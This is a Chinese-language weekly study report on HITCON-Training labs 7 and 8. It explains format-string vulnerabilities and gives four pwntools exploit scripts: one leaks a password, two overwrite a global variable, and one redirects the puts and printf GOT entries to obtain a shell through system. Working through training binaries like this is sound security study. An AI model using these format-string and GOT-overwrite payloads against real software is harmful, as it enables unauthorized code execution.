# week2
## hitcon-training -- lab7(crack)
密码是随机生成的 存在格式化字符串漏洞

<img width="264" alt="image" src="https://github.com/keepinggg/Weekly_Report/assets/62430054/076b02b9-cc70-4179-80f0-a5335602685f">


可以利用格式化字符串读获取password
### exp_crack.py
```python
from pwn import *
p = process("./crack")
# p = remote("ip",port)
context.log_level = 'debug'
# context.arch = 'amd64'
# context(os="linux", arch="amd64",log_level = "debug")

r = lambda : p.recv()
rx = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()

password_addr = 0x804a048

payload = p32(password_addr) + b'#%10$s'
ru('name ? ')
sl(payload)

ru('#')
password = u32(rx(4))
log.info("password ==> {}".format(hex(password)))

ru('password :')
sl(str(password))

shell()
```

## hitcon-training -- lab8(craxme)
存在格式化字符串漏洞 

<img width="306" alt="image" src="https://github.com/keepinggg/Weekly_Report/assets/62430054/0c88b93b-709f-49dc-a22f-0b5c98d00d13">

可以用格式化字符串写漏洞复写全局变量magic
前两个复写的方式相同
### exp_craxme1.py
```python
from pwn import *
p = process("./craxme")
# p = remote("ip",port)
context.log_level = 'debug'
# context.arch = 'amd64'
# context(os="linux", arch="amd64",log_level = "debug")

r = lambda : p.recv()
rx = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()

magic_addr = 0x804a038
magic_data = 0xDA 

payload = fmtstr_payload(7, {magic_addr:magic_data}, write_size="byte")
ru("magic :")
sl(payload)

shell()

#raw_input("Ther")
```

### exp_craxme2.py
```python
from pwn import *
p = process("./craxme")
# p = remote("ip",port)
context.log_level = 'debug'
# context.arch = 'amd64'
# context(os="linux", arch="amd64",log_level = "debug")

r = lambda : p.recv()
rx = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()

magic_addr = 0x804a038
magic_data = 0xFACEB00C

payload = p32(magic_addr) + p32(magic_addr+2)
payload+= b"%45060c%7$hn%19138c%8$hn"

raw_input("Ther")
ru("magic :")
sl(payload)

shell()
```

具体说一下getshell的方法
程序中有system函数 所以我们是可以通过覆盖某个函数的got表为system来getshell的
但只有一次格式化字符串的机会 在格式化字符串函数之后 可能执行的分支为system和puts函数

<img width="318" alt="image" src="https://github.com/keepinggg/Weekly_Report/assets/62430054/30fe380e-80cf-4db0-b51b-901a4d9bfdd8">

但调用这两个函数的参数不可控，所以需要复写其他函数的got表 最后发现只有printf函数的参数可控
那么我们可以将puts的got表覆盖为main函数调用read的地址
同时将printf的got表覆盖为system
这样在程序继续执行时就会调用puts函数 然后跳转到read@main 继续执行一次read和printf
在执行到printf时真正调用的是system 我们的输入就是system的参数

### exp_craxme3.py
```python
from pwn import *
p = process("./craxme")
# p = remote("ip",port)
context.log_level = 'debug'
# context.arch = 'amd64'
# context(os="linux", arch="amd64",log_level = "debug")

r = lambda : p.recv()
rx = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()

pritnf_got = 0x804a010
puts_got = 0x804a018
read_main = 0x804859B
system_plt = 0x8048410

payload = p32(puts_got) + p32(puts_got+2) + p32(pritnf_got) + p32(pritnf_got+2)
payload+= b"%34187c%7$hn%33385c%8$hn%31756c%9$hn%33780c%10$hn"

raw_input("Ther")
ru("magic :")
sl(payload)

shell()
```



